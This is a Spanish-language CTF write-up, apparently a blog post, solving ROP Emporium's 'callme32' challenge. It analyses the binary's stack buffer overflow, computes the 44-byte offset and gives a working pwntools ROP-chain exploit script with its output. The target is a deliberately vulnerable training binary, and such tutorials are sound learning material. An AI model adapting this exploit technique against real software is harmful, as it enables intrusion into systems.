---
layout: post
title: Callme32 - RopEmporium
tags: [ctf, rev, ropemporium]
---

**Autor**: RopEmporium \\
**Challenge**: 3

![img](/imgs/write-ups/ropemporium/callme32/callme32.png)

## Objetivo

Debes llamar a las funciones callme_one(), callme_two() y callme_three() en ese orden, cada una con los argumentos 0xdeadbeef, 0xcafebabe y 0xd00df00d, por ejemplo, llama a callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) para imprimir la bandera. 

## Conceptos teóricos

**Procedure Linkage Table**: La Procedure Linkage Table (PLT) en binarios ELF es una estructura utilizada para llamar a funciones dinámicas en bibliotecas compartidas. La PLT contiene una serie de stubs (pequeñas funciones) que redirigen las llamadas a funciones dinámicas al procedimiento de resolución adecuado en la tabla de resolución dinámica (Dynamic Symbol Table). Esto permite una resolución perezosa de las funciones dinámicas, lo que significa que la resolución real de la dirección de la función se realiza solo cuando se llama a la función por primera vez, lo que ahorra tiempo de inicio y memoria.

En lugar de resolver las direcciones de las funciones de inmediato, la PLT aplaza la resolución hasta que se llama a una función por primera vez, lo que ahorra tiempo y memoria en la carga inicial del programa. La PLT actúa como un intermediario que redirige las llamadas a las funciones a las direcciones reales de las funciones en tiempo de ejecución.

## Información del binario

```
[0xf7f80120]> iI
arch     x86
baddr    0x8048000
binsz    6305
bintype  elf
bits     32
canary   false
class    ELF32
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib/ld-linux.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  Intel 80386
nx       true
os       linux
pic      false
relocs   true
relro    partial
rpath    .
sanitize false
static   false
stripped false
subsys   linux
va       true
```

- **arch** (arquitectura): El binario está diseñado para la arquitectura x86.
- **baddr** (dirección base): La dirección base del binario es 0x8048000, lo que indica la dirección en la que se cargará en la memoria cuando se ejecute.
- **Canary**: No se utiliza la protección de canario para la detección de desbordamientos de búfer.
- **endian**: El binario utiliza el orden de bytes "little-endian".
- **nx** (No eXecute): El binario es compatible con la prevención de ejecución (NX), lo que significa que no se puede ejecutar código en áreas de memoria marcadas como no ejecutables.
- **stripped**:Contiene información de símbolos y depuración.

## Funciones

![img](/imgs/write-ups/ropemporium/callme32/callme32_1.png)

1. Recuadrado en verde tenemos la función **main** del programa.
2. En azul, las funciones que tenemos que llamar en el orden correcto.
3. En rojo están la función **pwnme** la cual habrá que explotar y **usefulFunction** que simplemente está para asegurar el "link" de las llamadas a las funciones.

### Main

```s
┌ 103: int main (char **argv);
│           ; var int32_t var_4h @ ebp-0x4
│           ; arg char **argv @ esp+0x24
│           0x08048686      8d4c2404       lea ecx, [argv]
│           0x0804868a      83e4f0         and esp, 0xfffffff0
│           0x0804868d      ff71fc         push dword [ecx - 4]
│           0x08048690      55             push ebp
│           0x08048691      89e5           mov ebp, esp
│           0x08048693      51             push ecx
│           0x08048694      83ec04         sub esp, 4
│           0x08048697      a13ca00408     mov eax, dword [loc._edata] ; obj.__TMC_END__
│                                                                      ; [0x804a03c:4]=0xf7e1eda0
│           0x0804869c      6a00           push 0
│           0x0804869e      6a02           push 2                      ; 2
│           0x080486a0      6a00           push 0
│           0x080486a2      50             push eax
│           0x080486a3      e888feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
│           0x080486a8      83c410         add esp, 0x10
│           0x080486ab      83ec0c         sub esp, 0xc
│           0x080486ae      6820880408     push str.callme_by_ROP_Emporium ; 0x8048820 ; "callme by ROP Emporium"
│           0x080486b3      e848feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x080486b8      83c410         add esp, 0x10
│           0x080486bb      83ec0c         sub esp, 0xc
│           0x080486be      6837880408     push str.x86_n              ; 0x8048837 ; "x86\n"
│           0x080486c3      e838feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x080486c8      83c410         add esp, 0x10
│           0x080486cb      e81d000000     call sym.pwnme
│           0x080486d0      83ec0c         sub esp, 0xc
│           0x080486d3      683c880408     push str._nExiting          ; 0x804883c ; "\nExiting"
│           0x080486d8      e823feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x080486dd      83c410         add esp, 0x10
│           0x080486e0      b800000000     mov eax, 0
│           0x080486e5      8b4dfc         mov ecx, dword [var_4h]
│           0x080486e8      c9             leave
│           0x080486e9      8d61fc         lea esp, [ecx - 4]
└           0x080486ec      c3             ret
```

Utilizando **ghidra** obtengo el siguiente código.
```c
undefined4 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  puts("callme by ROP Emporium");
  puts("x86\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```

Como se puede ver, solo llama a la función **pwnme**.

### pwnme

```s
┌ 98: sym.pwnme ();
│           ; var int32_t var_28h @ ebp-0x28
│           0x080486ed      55             push ebp
│           0x080486ee      89e5           mov ebp, esp
│           0x080486f0      83ec28         sub esp, 0x28
│           0x080486f3      83ec04         sub esp, 4
│           0x080486f6      6a20           push 0x20                   ; 32
│           0x080486f8      6a00           push 0
│           0x080486fa      8d45d8         lea eax, [var_28h]
│           0x080486fd      50             push eax
│           0x080486fe      e83dfeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
│           0x08048703      83c410         add esp, 0x10
│           0x08048706      83ec0c         sub esp, 0xc
│           0x08048709      6848880408     push str.Hope_you_read_the_instructions..._n ; 0x8048848 ; "Hope you read the instructions...\n"
│           0x0804870e      e8edfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x08048713      83c410         add esp, 0x10
│           0x08048716      83ec0c         sub esp, 0xc
│           0x08048719      686b880408     push 0x804886b
│           0x0804871e      e8adfdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x08048723      83c410         add esp, 0x10
│           0x08048726      83ec04         sub esp, 4
│           0x08048729      6800020000     push 0x200                  ; 512
│           0x0804872e      8d45d8         lea eax, [var_28h]
│           0x08048731      50             push eax
│           0x08048732      6a00           push 0
│           0x08048734      e887fdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x08048739      83c410         add esp, 0x10
│           0x0804873c      83ec0c         sub esp, 0xc
│           0x0804873f      686e880408     push str.Thank_you_         ; 0x804886e ; "Thank you!"
│           0x08048744      e8b7fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x08048749      83c410         add esp, 0x10
│           0x0804874c      90             nop
│           0x0804874d      c9             leave
└           0x0804874e      c3             ret
```

Igualmente uso **ghidra** para obtener un código en C.
```c
void pwnme(void)

{
  undefined input [40];
  
  memset(input,0,0x20);
  puts("Hope you read the instructions...\n");
  printf("> ");
  read(0,input,0x200);
  puts("Thank you!");
  return;
}
```

Este código presenta un bufferoverflow debido a que lee más datos que los reservados en memoría por lo que se podrá sobreescribir la dirección de retorno para ejecutar código, en este caso, las llamadas a las 3 funciones para obtener la bandera.

### usefulFuncitons

```c
void usefulFunction(void)

{
  callme_three(4,5,6);
  callme_two(4,5,6);
  callme_one(4,5,6);
  exit(1);
}
```

Esta función solo llama a las 3 funciones para asegurar que son enlazadas al en el binario.

```s
┌ 81: sym.usefulFunction ();
│           0x0804874f      55             push ebp
│           0x08048750      89e5           mov ebp, esp
│           0x08048752      83ec08         sub esp, 8
│           0x08048755      83ec04         sub esp, 4
│           0x08048758      6a06           push 6                      ; 6
│           0x0804875a      6a05           push 5                      ; 5
│           0x0804875c      6a04           push 4                      ; 4
│           0x0804875e      e87dfdffff     call sym.imp.callme_three
│           0x08048763      83c410         add esp, 0x10
│           0x08048766      83ec04         sub esp, 4
│           0x08048769      6a06           push 6                      ; 6
│           0x0804876b      6a05           push 5                      ; 5
│           0x0804876d      6a04           push 4                      ; 4
│           0x0804876f      e8dcfdffff     call sym.imp.callme_two
│           0x08048774      83c410         add esp, 0x10
│           0x08048777      83ec04         sub esp, 4
│           0x0804877a      6a06           push 6                      ; 6
│           0x0804877c      6a05           push 5                      ; 5
│           0x0804877e      6a04           push 4                      ; 4
│           0x08048780      e86bfdffff     call sym.imp.callme_one
│           0x08048785      83c410         add esp, 0x10
│           0x08048788      83ec0c         sub esp, 0xc
│           0x0804878b      6a01           push 1                      ; 1
│           0x0804878d      e87efdffff     call sym.imp.exit
│           0x08048792      6690           nop
│           0x08048794      6690           nop
```

Es necesario destacar que los valores son pasados a las funciones a través del stack.

## Exploit

### Padding

Para calcular el padding entre la dirección de la entrada del usuario y la dirección de retorno sitúo un breakpoint y busco en memoria la entrada.

```s
[0x0804874e]> pdf
┌ 98: sym.pwnme ();
│           ; var int32_t var_28h @ ebp-0x28
│           0x080486ed      55             push ebp
│           0x080486ee      89e5           mov ebp, esp
│           0x080486f0      83ec28         sub esp, 0x28
│           0x080486f3      83ec04         sub esp, 4
                        [...]
│           0x0804874d      c9             leave
└           0x0804874e      c3             ret
[0x0804874e]> db 0x0804874e
[0xf7fcc120]> dc
callme by ROP Emporium
x86

Hope you read the instructions...

> h3rshel
Thank you!
hit breakpoint at: 0x804874e
```
Después, se puede comprobar que el registro **esp** apunta a la dirección de retorno.

![img](/imgs/write-ups/ropemporium/callme32/callme32_2.png)

Ahora solo tengo que buscar la entrada proporcionada anteriormente y calcular al diferencia.

```s
[0x0804874e]> / h3rshel
Searching 7 bytes in [0xfff25000-0xfff46000]
hits: 10
0xfff43ad0 hit8_0 .n:h3rshel.
[...]
[0x0804874e]> ? esp - 0xfff43ad0
int32   44
uint32  44
hex     0x2c
```

Ahí está!! 44 bytes.

### Gadgets

Utilizo **radare2** para buscar los gadgets dentro del binario.

```s
[0x0804874e]> e search.in=dbg.maps.rx
[0x0804874e]> "/R pop"
```

![img](/imgs/write-ups/ropemporium/callme32/callme32_3.png)

Este gagdget será muy util para quitar los valores necesarios del stack y pasar a la siguiente función.

### Script

```py
'''
La estructura desdeada en el stack es la siguiente:
----------------------
|     callme_one     |
----------------------
|return addr (Gadget)|
--------------------
|        arg 1       |
--------------------
|        arg 2       |
--------------------
|        arg 3       |
----------------------
|     callme_two     |
----------------------
|return addr (Gadget)|
----------------------
|        arg 1       |
----------------------
|        arg 2       |
----------------------
|        arg 3       |
----------------------
|    callme_three    |
----------------------
|return addr (Gadget)|
----------------------
|        arg 1       |
----------------------
|        arg 2       |
----------------------
|        arg 3       |
----------------------
'''
#!/bin/python3

from pwn import *

programm = "./callme32"

p = process(programm)
elf = ELF(programm)
p.recvuntil(">")

# Functions
callme_one = p32(elf.sym.callme_one)        # 0x080484f0
callme_two = p32(elf.sym.callme_two)        # 0x08048550
callme_three = p32(elf.sym.callme_three)    # 0x080484e0

# Function params
params = p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)

popall = p32(0x080487f9) # pop esi; pop edi; pop ebp; ret

payload = b""
payload += b"A" * 44 # padding

# Call Functions
payload += callme_one
payload += popall
payload += params

payload += callme_two
payload += popall
payload += params

payload += callme_three
payload += popall
payload += params

p.sendline(payload)

print(p.recvall())
```

### Ejecución
```
h3rshel@kali:~/Desktop/reversing$ python3 exploit.py
[+] Starting local process './callme32': pid 72748
[*] '/home/h3rshel/Desktop/reversing/callme32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b'.'
[...]
  p.recvuntil(">")
[+] Receiving all data: Done (105B)
[*] Process './callme32' stopped with exit code 0 (pid 72748)
b' Thank you!\ncallme_one() called correctly\ncallme_two() called correctly\nROPE{a_placeholder_32byte_flag!}\n'
```

Y con esto termina mi solución. :)
